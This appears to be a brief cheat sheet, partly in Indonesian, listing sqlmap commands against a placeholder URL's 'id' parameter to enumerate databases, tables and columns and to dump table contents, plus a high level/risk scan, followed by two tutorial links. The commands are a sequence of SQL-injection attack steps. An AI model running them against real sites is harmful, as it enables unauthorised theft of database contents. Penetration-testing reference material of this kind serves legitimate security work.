# SQLMAP

1. situsanda.com/news.php?id=1
2. python2 sqlmap.py "situsanda.com/news.php?id=1" --dbs
3. python2 sqlmap.py "situsanda.com/news.php?id=1" --tables -D situsanda
4. python2 sqlmap.py "situsanda.com/news.php?id=1" --columns -D namadatabase -T namatabel
5. python2 sqlmap.py "situsanda.com/news.php?id=1" --dump -D namadatabase -T namatabel
6. python2 sqlmap.py "situsanda.com/news.php?id=1" --level=5 --risk=3 --dbs

Reference : 
1. https://sangtopihitam.blogspot.com/2020/02/tutorial-install-sqlmap-dan-cara.html
2. https://hackertarget.com/sqlmap-tutorial/
